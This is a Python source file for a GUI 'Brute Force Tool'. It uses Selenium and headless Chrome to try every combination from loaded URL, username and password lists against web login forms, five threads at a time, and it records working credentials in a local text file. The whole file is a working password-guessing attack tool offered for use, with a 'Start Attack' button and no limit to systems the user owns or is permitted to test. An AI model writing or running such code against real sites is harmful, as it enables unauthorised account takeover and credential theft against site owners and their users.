# brute_force_tool_enhanced.py

import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import threading
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
import time
import os
import json
import subprocess
import sys

class BruteForceApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Brute Force Tool")
        self.root.geometry("600x780")

        # --- Initialize flags and paths ---
        self.url_file_path = None
        self.username_file_path = None
        self.password_file_path = None
        self.driver_path = None
        self.success_found = False
        self.successful_attempts_count = 0
        self.farts_file_lock = threading.Lock()
        self.config_file_path = "brute_force_config.json"
        self.stop_requested = False # New flag for stopping the attack

        # --- Tkinter Widgets Initialization ---

        # Status output
        self.status_label = tk.Label(root, text="Status: Ready", wraplength=580, justify=tk.LEFT)
        self.status_label.pack(pady=5)

        # Debug mode checkbox
        self.debug_var = tk.IntVar()
        self.debug_checkbox = tk.Checkbutton(root, text="Enable Debug Logging", variable=self.debug_var)
        self.debug_checkbox.pack(pady=5)

        # Configure Settings Button
        tk.Button(root, text="Configure Web Element Locators", command=self.open_config_tool).pack(pady=10)
        tk.Label(root, text="(Use this to set Username, Password, Login Button Locators)").pack(pady=2)

        # Displayed/Configured Element IDs (Disabled, values loaded from config)
        tk.Label(root, text="Configured Element Locators (read-only):", font=("Arial", 10, "bold")).pack(pady=(15,0))

        tk.Label(root, text="Username Field ID:").pack(pady=(5,0))
        self.username_entry = tk.Entry(root, width=70, state='readonly')
        self.username_entry.pack(pady=2)

        tk.Label(root, text="Password Field ID:").pack(pady=(5,0))
        self.password_entry = tk.Entry(root, width=70, state='readonly')
        self.password_entry.pack(pady=2)

        tk.Label(root, text="Login Button Locator (Optional):").pack(pady=(5,0))
        self.login_button_entry = tk.Entry(root, width=70, state='readonly')
        self.login_button_entry.pack(pady=2)
        
        # --- WebDriver Setup ---
        self.install_driver_once()

        # --- Load Configuration ---
        self.config = {}
        self.load_configuration()

        # URL list section
        tk.Label(root, text="1. Load URL List:").pack(pady=(15,0))
        self.load_url_btn = tk.Button(root, text="Browse URL File", command=self.load_url_file)
        self.load_url_btn.pack(pady=2)
        self.url_file_path_label = tk.Label(root, text="No URL file loaded")
        self.url_file_path_label.pack(pady=2)

        # Username list section
        tk.Label(root, text="2. Load Username List (optional, defaults to 'admin'):").pack(pady=(10,0))
        self.load_username_btn = tk.Button(root, text="Browse Username File", command=self.load_username_file)
        self.load_username_btn.pack(pady=2)
        self.username_file_path_label = tk.Label(root, text="No Username file loaded")
        self.username_file_path_label.pack(pady=2)

        # Password list section
        tk.Label(root, text="3. Load Password List:").pack(pady=(10,0))
        self.load_pass_btn = tk.Button(root, text="Browse Password File", command=self.load_password_file)
        self.load_pass_btn.pack(pady=2)
        self.password_file_path_label = tk.Label(root, text="No Password file loaded")
        self.password_file_path_label.pack(pady=2)
        
        # Start and Stop Attack buttons
        button_frame = tk.Frame(root)
        button_frame.pack(pady=20)

        self.start_btn = tk.Button(button_frame, text="Start Attack", command=self.start_attack_thread)
        self.start_btn.pack(side=tk.LEFT, padx=10)

        self.stop_btn = tk.Button(button_frame, text="STOP Attack", command=self.stop_attack, bg="red", fg="white")
        self.stop_btn.pack(side=tk.LEFT, padx=10)
        self.stop_btn.config(state=tk.DISABLED) # Initially disabled

        # Successful Attempts Display
        self.success_count_label = tk.Label(root, text="Successful Logins: 0", font=("Arial", 10, "bold"))
        self.success_count_label.pack(pady=(10, 5))

        self.success_log_text = scrolledtext.ScrolledText(root, width=70, height=8, state='disabled')
        self.success_log_text.pack(pady=5)
        self.success_log_text.tag_configure("green", foreground="green")


    def load_configuration(self):
        """Loads configuration from the brute_force_config.json file."""
        if os.path.exists(self.config_file_path):
            try:
                with open(self.config_file_path, 'r') as f:
                    self.config = json.load(f)
                self.update_status("Configuration loaded successfully from config file.")
            except Exception as e:
                self.config = {}
                messagebox.showerror("Config Load Error", f"Failed to load configuration from {self.config_file_path}: {e}\n"
                                                        "Please run the 'Configure Web Element Locators' tool.")
                self.update_status("Failed to load configuration. Please configure.")
        else:
            self.config = {}
            messagebox.showwarning("Configuration Missing", "Configuration file 'brute_force_config.json' not found.\n"
                                                           "Please use the 'Configure Web Element Locators' button to set them up.")
            self.update_status("Configuration file not found. Please configure.")
        
        self.config.setdefault('username_field_id', '')
        self.config.setdefault('password_field_id', '')
        self.config.setdefault('login_button_locator', '')

        self.update_config_display()


    def update_config_display(self):
        """Updates the read-only entry fields with the current configuration."""
        self.username_entry.config(state='normal')
        self.username_entry.delete(0, tk.END)
        self.username_entry.insert(0, self.config.get('username_field_id', ''))
        self.username_entry.config(state='readonly')

        self.password_entry.config(state='normal')
        self.password_entry.delete(0, tk.END)
        self.password_entry.insert(0, self.config.get('password_field_id', ''))
        self.password_entry.config(state='readonly')

        self.login_button_entry.config(state='normal')
        self.login_button_entry.delete(0, tk.END)
        self.login_button_entry.insert(0, self.config.get('login_button_locator', ''))
        self.login_button_entry.config(state='readonly')


    def open_config_tool(self):
        """Opens the separate configuration tool using subprocess."""
        script_dir = os.path.dirname(os.path.abspath(__file__))
        config_tool_path = os.path.join(script_dir, "brute_force_config_tool.py")

        if not os.path.exists(config_tool_path):
            messagebox.showerror("Error", f"Configurator tool not found at: {config_tool_path}\n"
                                           "Please ensure 'brute_force_config_tool.py' is in the same directory.")
            return

        try:
            subprocess.Popen([sys.executable, config_tool_path])
            self.update_status("Configurator tool launched. Please save settings there.")
            # Reload configuration after a delay to ensure changes are picked up
            self.root.after(3000, self.load_configuration)
        except Exception as e:
            messagebox.showerror("Launch Error", f"Failed to launch configurator tool: {e}")


    def install_driver_once(self):
        """Installs the Chrome WebDriver once."""
        if self.driver_path:
            return

        self.update_status("Installing Chrome WebDriver (this may take a moment)...")
        try:
            self.root.update_idletasks()
            self.driver_path = ChromeDriverManager().install()
            self.update_status("WebDriver installed successfully.")
            self.log(f"WebDriver installed at: {self.driver_path}")
        except Exception as e:
            error_message = (
                f"Failed to install Chrome WebDriver: {e}\n"
                "Please ensure you have Google Chrome installed and an active internet connection.\n"
                "You might also need to run this script with administrator/root privileges if installation fails."
            )
            self.update_status(f"WebDriver Installation Failed: {e}")
            messagebox.showerror("WebDriver Error", error_message)
            self.start_btn.config(state=tk.DISABLED)

    def log(self, message):
        """Prints messages to console if debug logging is enabled."""
        if self.debug_var.get():
            print(message)

    def update_status(self, message):
        """Updates the status label on the GUI."""
        self.status_label.config(text=f"Status: {message}")
        self.root.update_idletasks()

    def load_url_file(self):
        self.url_file_path = filedialog.askopenfilename(title="Select URL File", filetypes=(("Text Files", "*.txt"),))
        if self.url_file_path:
            self.url_file_path_label.config(text=f"Loaded: {os.path.basename(self.url_file_path)}")
            self.log(f"Loaded URLs from {self.url_file_path}")
            self.update_status(f"URL list loaded: {os.path.basename(self.url_file_path)}")

    def load_password_file(self):
        self.password_file_path = filedialog.askopenfilename(title="Select Password File", filetypes=(("Text Files", "*.txt"),))
        if self.password_file_path:
            self.password_file_path_label.config(text=f"Loaded: {os.path.basename(self.password_file_path)}")
            self.log(f"Loaded passwords from {self.password_file_path}")
            self.update_status(f"Password list loaded: {os.path.basename(self.password_file_path)}")

    def load_username_file(self):
        self.username_file_path = filedialog.askopenfilename(title="Select Username File", filetypes=(("Text Files", "*.txt"),))
        if self.username_file_path:
            self.username_file_path_label.config(text=f"Loaded: {os.path.basename(self.username_file_path)}")
            self.log(f"Loaded usernames from {self.username_file_path}")
            self.update_status(f"Username list loaded: {os.path.basename(self.username_file_path)}")

    def start_attack_thread(self):
        """Starts the attack in a separate thread to keep the UI responsive."""
        username_field_id = self.config.get('username_field_id')
        password_field_id = self.config.get('password_field_id')
        login_button_locator = self.config.get('login_button_locator')

        if not self.driver_path:
            messagebox.showerror("Error", "WebDriver not installed. Cannot start attack.")
            return

        if not username_field_id or not password_field_id:
            messagebox.showwarning("Configuration Missing", "Username Field ID or Password Field ID are missing from configuration.\n"
                                                           "Please use the 'Configure Web Element Locators' button to set them up.")
            return

        if not self.url_file_path or not self.password_file_path:
            messagebox.showwarning("Input Error", "Please ensure URL and Password files are selected.")
            return
        
        self.start_btn.config(state=tk.DISABLED) # Disable start button
        self.stop_btn.config(state=tk.NORMAL)   # Enable stop button
        self.successful_attempts_count = 0
        self.success_count_label.config(text="Successful Logins: 0")
        self.success_log_text.config(state='normal')
        self.success_log_text.delete(1.0, tk.END)
        self.success_log_text.config(state='disabled')
        
        self.update_status("Attack started...")
        self.success_found = False
        self.stop_requested = False # Reset stop flag for a new attack

        attack_thread = threading.Thread(target=self._run_attack, args=(username_field_id, password_field_id, login_button_locator))
        attack_thread.start()

    def stop_attack(self):
        """Sets the flag to stop the ongoing brute-force attack."""
        self.stop_requested = True
        self.update_status("Stop requested. Waiting for current attempts to finish...")
        self.start_btn.config(state=tk.NORMAL) # Allow starting a new attack
        self.stop_btn.config(state=tk.DISABLED) # Disable stop button once pressed

    def _run_attack(self, username_field_id, password_field_id, login_button_locator):
        """Core logic for the brute-force attack, run in a separate thread."""
        try:
            with open(self.url_file_path, 'r') as url_file:
                urls = [line.strip() for line in url_file if line.strip()]

            with open(self.password_file_path, 'r') as pass_file:
                passwords = [line.strip() for line in pass_file if line.strip()]

            usernames = []
            if self.username_file_path:
                with open(self.username_file_path, 'r') as user_file:
                    usernames = [line.strip() for line in user_file if line.strip()]
            if not usernames:
                usernames = ['admin']

            self.log(f"Loaded URLs: {urls}")
            self.log(f"Loaded Usernames: {usernames}")
            self.log(f"Loaded Passwords: {passwords}")

            max_threads = 5
            sem = threading.Semaphore(max_threads)
            threads = []
            
            total_attempts = len(urls) * len(usernames) * len(passwords)
            attempt_count = 0

            for url in urls:
                if self.stop_requested: break # Check stop flag
                for username in usernames:
                    if self.stop_requested: break # Check stop flag
                    for password in passwords:
                        if self.stop_requested: break # Check stop flag

                        attempt_count += 1
                        self.root.after(0, self.update_status, f"Attempting {attempt_count}/{total_attempts}: {url} | User: {username} | Pass: {password}")
                        
                        thread = threading.Thread(target=self.wrapped_attempt, 
                                                args=(sem, url, username_field_id, password_field_id, login_button_locator, username, password))
                        threads.append(thread)
                        thread.start()

            # Wait for all launched threads to complete (or for stop to be requested)
            for thread in threads:
                if self.stop_requested: # If stop was requested, don't wait indefinitely for all threads
                    self.log("Stop requested during thread join. Attempting to interrupt.")
                    break # Break out of joining loop. Threads will finish their current attempt and then exit.
                thread.join(timeout=1) # Join with a timeout to periodically check stop_requested if needed
                if thread.is_alive() and self.stop_requested: # If thread is still alive and stop requested, don't wait longer
                    self.log(f"Thread for {thread.name} still alive but stop requested. Moving on.")
                    
            if self.stop_requested:
                self.root.after(0, self.update_status, "Attack stopped by user.")
                self.root.after(0, messagebox.showinfo, "Attack Stopped", "The attack was stopped by your request.")
            elif not self.success_found:
                self.root.after(0, self.update_status, "Attack finished. No successful login found.")
                self.root.after(0, messagebox.showinfo, "Attack Finished", "No successful login found.")
            else:
                self.root.after(0, self.update_status, f"Attack finished. Found {self.successful_attempts_count} successful logins.")
            
        except Exception as e:
            self.root.after(0, self.update_status, f"Attack failed: {e}")
            self.log(f"Attack failed: {e}")
        finally:
            self.root.after(0, self.start_btn.config, state=tk.NORMAL)
            self.root.after(0, self.stop_btn.config, state=tk.DISABLED)

    def wrapped_attempt(self, sem, url, username_field_id, password_field_id, login_button_locator, username, password):
        """Wrapper for attempt_login to manage semaphore and stop flag."""
        with sem:
            if self.stop_requested: # Check stop flag before starting a new attempt
                self.log(f"Skipping {username}:{password} for {url} due to stop request.")
                return
            if self.success_found:
                self.log(f"Skipping {username}:{password} for {url} as success already found.")
                return

            self.log(f"Attempting login on {url} with user: {username}, pass: {password}")
            try:
                if self.attempt_login(url, username_field_id, password_field_id, login_button_locator, username, password):
                    self.success_found = True
                    self.root.after(0, self.increment_success_count)
                    self.root.after(0, self.log_successful_attempt, url, username, password)
                    self.root.after(0, self.save_successful_attempt, url, username, password)
                    return
            except Exception as e:
                self.log(f"Error during attempt on {url} with {username}:{password}: {e}")


    def increment_success_count(self):
        """Increments the success counter and updates the GUI label."""
        self.successful_attempts_count += 1
        self.success_count_label.config(text=f"Successful Logins: {self.successful_attempts_count}")

    def log_successful_attempt(self, url, username, password):
        """Logs a successful attempt to the scrolled text widget."""
        self.success_log_text.config(state='normal')
        self.success_log_text.insert(tk.END, f"SUCCESS: URL: {url}, User: {username}, Pass: {password}\n", "green")
        self.success_log_text.see(tk.END)
        self.success_log_text.config(state='disabled')

    def save_successful_attempt(self, url, username, password):
        """Saves a successful attempt to the 'farts.txt' file."""
        with self.farts_file_lock:
            try:
                with open("farts.txt", "a") as f:
                    f.write(f"URL: {url}, Username: {username}, Password: {password}\n")
                self.log(f"Saved successful attempt to farts.txt: {url}, {username}, {password}")
            except Exception as e:
                self.log(f"Error saving successful attempt to farts.txt: {e}")


    def attempt_login(self, url, username_field_id, password_field_id, login_button_locator, username, password):
        """
        Attempts a login for a given URL, username, and password.
        Returns True on perceived success, False otherwise.
        Now supports XPath and CSS Selector for the login button.
        """
        driver = None
        try:
            options = webdriver.ChromeOptions()
            options.add_argument('--headless')
            options.add_argument('--log-level=3')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            
            service = webdriver.ChromeService(executable_path=self.driver_path)
            driver = webdriver.Chrome(service=service, options=options)
            
            if not url.startswith("http://") and not url.startswith("https://"):
                url = "http://" + url

            self.log(f"Navigating to {url}")
            driver.get(url)
            time.sleep(1)

            # Check for stop request after page load but before interacting with elements
            if self.stop_requested:
                self.log(f"Stop requested while navigating to {url}. Quitting driver.")
                return False

            username_field = WebDriverWait(driver, 15).until(
                EC.visibility_of_element_located((By.ID, username_field_id))
            )
            username_field.send_keys(username)
            self.log(f"Entered username: {username}")

            password_field = WebDriverWait(driver, 15).until(
                EC.visibility_of_element_located((By.ID, password_field_id))
            )
            password_field.send_keys(password)
            self.log(f"Entered password: {password}")

            if login_button_locator:
                by_strategy = None
                if login_button_locator.startswith('/') or login_button_locator.startswith('./'):
                    by_strategy = By.XPATH
                    self.log(f"Using XPath for login button: {login_button_locator}")
                elif login_button_locator.startswith('#') or login_button_locator.startswith('.'):
                    by_strategy = By.CSS_SELECTOR
                    self.log(f"Using CSS Selector for login button: {login_button_locator}")
                else:
                    by_strategy = By.ID
                    self.log(f"Using ID for login button: {login_button_locator}")

                login_button = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((by_strategy, login_button_locator))
                )
                login_button.click()
                self.log("Clicked login button.")
            else:
                password_field.send_keys(Keys.RETURN)
                self.log("Pressed RETURN on password field.")

            # --- Success/Failure Detection (Crucial: YOU MUST CUSTOMIZE THIS) ---
            initial_url_base = url.split('?')[0].split('#')[0]

            try:
                WebDriverWait(driver, 10).until(
                    EC.url_changes(initial_url_base) or
                    EC.url_contains("/dashboard") or EC.url_contains("/home") or
                    EC.presence_of_element_located((By.ID, "user-profile-widget")) or
                    EC.presence_of_element_located((By.CLASS_NAME, "logged-in-user-menu")) or
                    EC.presence_of_element_located((By.LINK_TEXT, "Logout"))
                )
                self.log(f"Login successful for {username}:{password} on {url} (based on URL/element change).")
                return True
            except Exception as e:
                self.log(f"No clear success indicator found via URL/element change for {username}:{password}: {e}")

            error_messages = [
                "invalid credentials", "incorrect username or password",
                "login failed", "authentication failed", "access denied",
                "invalid username or password", "username or password incorrect",
                "wrong username or password", "error logging in"
            ]
            page_source_lower = driver.page_source.lower()

            for error_msg in error_messages:
                if error_msg in page_source_lower:
                    self.log(f"Login failed for {username}:{password} on {url} (error message: '{error_msg}' found).")
                    return False

            current_url_base = driver.current_url.split('?')[0].split('#')[0]
            if current_url_base == initial_url_base:
                 self.log(f"Login failed for {username}:{password} on {url} (remained on login page).")
                 return False

            self.log(f"Login attempt inconclusive for {username}:{password} on {url}. Assuming failure.")
            return False

        except Exception as e:
            self.log(f"An error occurred during Selenium operation for {username}:{password} on {url}: {e}")
            return False
        finally:
            if driver:
                try:
                    driver.quit()
                except Exception as ex:
                    self.log(f"Error shutting down WebDriver: {ex}")

# --- Main application execution ---
if __name__ == "__main__":
    root = tk.Tk()
    app = BruteForceApp(root)
    root.mainloop()